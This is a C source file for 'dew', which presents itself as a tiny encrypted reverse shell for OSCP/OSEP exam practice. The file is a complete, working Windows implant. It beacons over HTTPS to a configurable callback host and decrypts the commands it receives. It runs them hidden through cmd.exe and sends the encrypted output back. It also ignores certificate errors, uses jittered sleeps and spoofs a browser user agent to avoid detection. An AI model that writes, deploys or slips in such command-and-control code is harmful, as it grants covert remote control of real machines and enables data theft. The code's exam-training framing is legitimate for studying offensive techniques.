/*
 * dew - Tiny Encrypted Reverse Shell
 * XChaCha20-Poly1305 over HTTPS (WinHTTP)
 * For OSCP/OSEP exam preparation
 */

#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include "monocypher.h"

#pragma GCC diagnostic ignored "-Wcast-function-type"

/* ── compile-time config (overridden via -D flags) ── */
#ifndef CALLBACK_HOST
#define CALLBACK_HOST "127.0.0.1"
#endif

#ifndef CALLBACK_PORT
#define CALLBACK_PORT 443
#endif

#ifndef PSK
#define PSK "0000000000000000000000000000000000000000000000000000000000000000"
#endif

#ifndef SLEEP_BASE
#define SLEEP_BASE 5000
#endif

#ifndef JITTER_PCT
#define JITTER_PCT 30
#endif

#ifndef USER_AGENT
#define USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
#endif

#define MAX_OUTPUT   (64 * 1024)
#define NONCE_SIZE   24
#define MAC_SIZE     16
#define KEY_SIZE     32
#define BEACON_SIZE  8

/* ── RtlGenRandom import ── */
typedef BOOLEAN (WINAPI *pRtlGenRandom)(PVOID, ULONG);
static pRtlGenRandom fnRtlGenRandom = NULL;

static int init_rng(void) {
    HMODULE hAdv = LoadLibraryA("advapi32.dll");
    if (!hAdv) return -1;
    fnRtlGenRandom = (pRtlGenRandom)GetProcAddress(hAdv, "SystemFunction036");
    return fnRtlGenRandom ? 0 : -1;
}

static int rand_bytes(uint8_t *buf, size_t len) {
    return fnRtlGenRandom(buf, (ULONG)len) ? 0 : -1;
}

/* ── hex decode ── */
static int hex_char(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

static int hex_decode(const char *hex, uint8_t *out, size_t out_len) {
    for (size_t i = 0; i < out_len; i++) {
        int hi = hex_char(hex[i * 2]);
        int lo = hex_char(hex[i * 2 + 1]);
        if (hi < 0 || lo < 0) return -1;
        out[i] = (uint8_t)((hi << 4) | lo);
    }
    return 0;
}

/* ── encrypt: returns malloc'd buffer [nonce(24)][mac(16)][ciphertext] ── */
static uint8_t *encrypt_msg(const uint8_t key[KEY_SIZE],
                            const uint8_t *plain, size_t plain_len,
                            size_t *out_len) {
    *out_len = NONCE_SIZE + MAC_SIZE + plain_len;
    uint8_t *buf = (uint8_t *)malloc(*out_len);
    if (!buf) return NULL;

    uint8_t *nonce  = buf;
    uint8_t *mac    = buf + NONCE_SIZE;
    uint8_t *cipher = buf + NONCE_SIZE + MAC_SIZE;

    rand_bytes(nonce, NONCE_SIZE);
    crypto_aead_lock(cipher, mac, key, nonce, NULL, 0, plain, plain_len);
    return buf;
}

/* ── decrypt: returns malloc'd plaintext, or NULL on failure ── */
static uint8_t *decrypt_msg(const uint8_t key[KEY_SIZE],
                            const uint8_t *data, size_t data_len,
                            size_t *plain_len) {
    if (data_len < NONCE_SIZE + MAC_SIZE) return NULL;

    const uint8_t *nonce  = data;
    const uint8_t *mac    = data + NONCE_SIZE;
    const uint8_t *cipher = data + NONCE_SIZE + MAC_SIZE;
    *plain_len = data_len - NONCE_SIZE - MAC_SIZE;

    uint8_t *plain = (uint8_t *)malloc(*plain_len + 1);
    if (!plain) return NULL;

    if (crypto_aead_unlock(plain, mac, key, nonce, NULL, 0, cipher, *plain_len) != 0) {
        free(plain);
        return NULL;
    }
    plain[*plain_len] = '\0';
    return plain;
}

/* ── execute command, return malloc'd output ── */
static char *exec_cmd(const char *cmd, DWORD *out_len) {
    SECURITY_ATTRIBUTES sa;
    sa.nLength              = sizeof(sa);
    sa.lpSecurityDescriptor = NULL;
    sa.bInheritHandle       = TRUE;

    HANDLE hReadPipe, hWritePipe;
    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0))
        return NULL;

    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    si.cb         = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError  = hWritePipe;

    /* build command line: "cmd.exe /c <command>" */
    size_t cmdline_len = 11 + strlen(cmd) + 1; /* "cmd.exe /c " + cmd + NUL */
    char *cmdline = (char *)malloc(cmdline_len);
    if (!cmdline) {
        CloseHandle(hReadPipe);
        CloseHandle(hWritePipe);
        return NULL;
    }
    snprintf(cmdline, cmdline_len, "cmd.exe /c %s", cmd);

    BOOL ok = CreateProcessA(NULL, cmdline, NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    free(cmdline);
    CloseHandle(hWritePipe);

    if (!ok) {
        CloseHandle(hReadPipe);
        return NULL;
    }

    /* read output up to MAX_OUTPUT */
    char *output = (char *)malloc(MAX_OUTPUT + 32);
    if (!output) {
        CloseHandle(hReadPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return NULL;
    }

    DWORD total = 0, bytesRead;
    int truncated = 0;
    while (total < MAX_OUTPUT) {
        DWORD to_read = MAX_OUTPUT - total;
        if (!ReadFile(hReadPipe, output + total, to_read, &bytesRead, NULL) || bytesRead == 0)
            break;
        total += bytesRead;
    }

    /* check if there's more data (truncated) */
    if (total >= MAX_OUTPUT) {
        char dummy[1];
        if (ReadFile(hReadPipe, dummy, 1, &bytesRead, NULL) && bytesRead > 0)
            truncated = 1;
    }

    if (truncated) {
        const char *marker = "\n[TRUNCATED at 64KB]";
        memcpy(output + total, marker, strlen(marker));
        total += (DWORD)strlen(marker);
    }

    CloseHandle(hReadPipe);
    WaitForSingleObject(pi.hProcess, 10000);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    *out_len = total;
    return output;
}

/* ── jitter sleep ── */
static void jitter_sleep(void) {
    ULONG jitter_rand;
    rand_bytes((uint8_t *)&jitter_rand, sizeof(jitter_rand));
    DWORD jitter_range = SLEEP_BASE * JITTER_PCT / 100;
    DWORD sleep_ms;
    if (jitter_range == 0) {
        sleep_ms = SLEEP_BASE;
    } else {
        sleep_ms = SLEEP_BASE - jitter_range + (jitter_rand % (2 * jitter_range));
    }
    Sleep(sleep_ms);
}

/* ── WinHTTP helpers ── */
static HINTERNET g_hSession  = NULL;
static HINTERNET g_hConnect  = NULL;

static int http_init(void) {
    /* convert USER_AGENT to wide string */
    wchar_t wAgent[256];
    MultiByteToWideChar(CP_UTF8, 0, USER_AGENT, -1, wAgent, 256);

    g_hSession = WinHttpOpen(wAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!g_hSession) return -1;

    /* convert host to wide string */
    wchar_t wHost[256];
    MultiByteToWideChar(CP_UTF8, 0, CALLBACK_HOST, -1, wHost, 256);

    g_hConnect = WinHttpConnect(g_hSession, wHost, CALLBACK_PORT, 0);
    if (!g_hConnect) return -1;

    return 0;
}

static void http_cleanup(void) {
    if (g_hConnect) WinHttpCloseHandle(g_hConnect);
    if (g_hSession) WinHttpCloseHandle(g_hSession);
}

/* send HTTP POST, return response body (malloc'd) and size, or NULL */
static uint8_t *http_post(const wchar_t *path,
                          const uint8_t *body, size_t body_len,
                          DWORD *resp_len, DWORD *status_code) {
    *resp_len = 0;
    *status_code = 0;

    HINTERNET hRequest = WinHttpOpenRequest(
        g_hConnect, L"POST", path, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) return NULL;

    /* bypass self-signed cert validation */
    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
                  SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                  SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

    /* send request */
    BOOL ok = WinHttpSendRequest(
        hRequest,
        L"Content-Type: application/octet-stream\r\n", (DWORD)-1,
        (LPVOID)body, (DWORD)body_len, (DWORD)body_len, 0);

    if (!ok || !WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        return NULL;
    }

    /* get status code */
    DWORD sc_size = sizeof(*status_code);
    WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                        NULL, status_code, &sc_size, NULL);

    /* read response body */
    uint8_t *resp = NULL;
    DWORD total = 0;
    DWORD bytesRead;
    uint8_t tmp[4096];

    while (WinHttpReadData(hRequest, tmp, sizeof(tmp), &bytesRead) && bytesRead > 0) {
        uint8_t *newbuf = (uint8_t *)realloc(resp, total + bytesRead);
        if (!newbuf) { free(resp); WinHttpCloseHandle(hRequest); return NULL; }
        resp = newbuf;
        memcpy(resp + total, tmp, bytesRead);
        total += bytesRead;
    }

    WinHttpCloseHandle(hRequest);
    *resp_len = total;
    return resp;
}

/* ── main ── */
int main(void) {
    /* init RNG */
    if (init_rng() != 0) return 1;

    /* decode PSK */
    uint8_t key[KEY_SIZE];
    if (hex_decode(PSK, key, KEY_SIZE) != 0) return 1;

    /* generate beacon ID */
    uint8_t beacon_id[BEACON_SIZE];
    rand_bytes(beacon_id, BEACON_SIZE);

    /* init HTTP */
    if (http_init() != 0) return 1;

    /* main callback loop */
    while (1) {
        /* encrypt beacon ID for poll */
        size_t poll_len;
        uint8_t *poll_data = encrypt_msg(key, beacon_id, BEACON_SIZE, &poll_len);
        if (!poll_data) {
            jitter_sleep();
            continue;
        }

        /* POST /poll */
        DWORD resp_len, status;
        uint8_t *resp = http_post(L"/poll", poll_data, poll_len, &resp_len, &status);
        free(poll_data);

        if (!resp || status != 200 || resp_len == 0) {
            free(resp);
            jitter_sleep();
            continue;
        }

        /* decrypt command */
        size_t cmd_len;
        uint8_t *cmd = decrypt_msg(key, resp, resp_len, &cmd_len);
        free(resp);

        if (!cmd) {
            jitter_sleep();
            continue;
        }

        /* check for EXIT command */
        if (cmd_len >= 4 && memcmp(cmd, "EXIT", 4) == 0) {
            free(cmd);
            break;
        }

        /* execute command */
        DWORD out_len = 0;
        char *output = exec_cmd((const char *)cmd, &out_len);
        free(cmd);

        if (!output) {
            /* send empty result on exec failure */
            const uint8_t empty[] = "[!] Command execution failed\n";
            size_t enc_len;
            uint8_t *enc = encrypt_msg(key, empty, sizeof(empty) - 1, &enc_len);
            if (enc) {
                DWORD rl, sc;
                uint8_t *r = http_post(L"/result", enc, enc_len, &rl, &sc);
                free(r);
                free(enc);
            }
            jitter_sleep();
            continue;
        }

        /* encrypt and send result */
        size_t enc_len;
        uint8_t *enc = encrypt_msg(key, (uint8_t *)output, out_len, &enc_len);
        free(output);

        if (enc) {
            DWORD rl, sc;
            uint8_t *r = http_post(L"/result", enc, enc_len, &rl, &sc);
            free(r);
            free(enc);
        }

        jitter_sleep();
    }

    http_cleanup();
    crypto_wipe(key, KEY_SIZE);
    ExitProcess(0);
    return 0;
}
